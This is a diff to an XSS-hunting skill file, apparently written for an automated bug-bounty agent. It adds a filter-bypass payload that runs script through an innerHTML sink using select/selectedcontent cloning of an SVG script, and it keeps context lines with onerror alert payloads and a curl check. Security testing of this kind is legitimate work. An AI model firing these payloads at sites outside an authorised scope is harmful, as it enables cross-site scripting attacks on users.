@@ -1,8 +1,8 @@
 ---
 name: hunt-xss
-description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
-sources: github, hackerone_public
-report_count: 174
+description: Hunting skill for xss vulnerabilities. Built from 175 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
+sources: github, hackerone_public, public_research
+report_count: 175
 ---
 
 ## Autonomous Testing Priority
@@ -326,6 +326,13 @@ curl -sk "https://target.com/page" | grep -i "evil.com"
 <video src=x onerror=alert(1)>
 <audio src=x onerror=alert(1)>
 ```
+
+**innerHTML sink with no `=` allowed (character-restricted injection):**
+When the sink is `innerHTML` (or anything that builds nodes the same way the HTML parser does) and the filter strips `=`, `/`, or whitespace, a native `<select>`/`<selectedcontent>` clone can smuggle the execution. `<selectedcontent>` mirrors the child nodes of the currently-selected `<option>` using the same deep-clone algorithm as `cloneNode(true)` — and if no option has `selected`, the first option is picked by default, so the payload needs no attributes at all. Some browser engines don't mark an SVG `<script>` created via `innerHTML` as "already started" the way an HTML `<script>` is, so when `<selectedcontent>` clones that SVG script, the clone actually runs:
+```html
+<select><selectedcontent></selectedcontent><option><svg><script>alert(1)</script>
+```
+Browser-version dependent (this execution path gets patched over time as engines start flagging the cloned SVG script too — test the live target browser rather than assuming it works). Source: <https://portswigger.net/research/achieving-the-impossible-xss-in-innerhtml-without-equals>.
 
 **Redirect-based XSS bypass:**
 ```
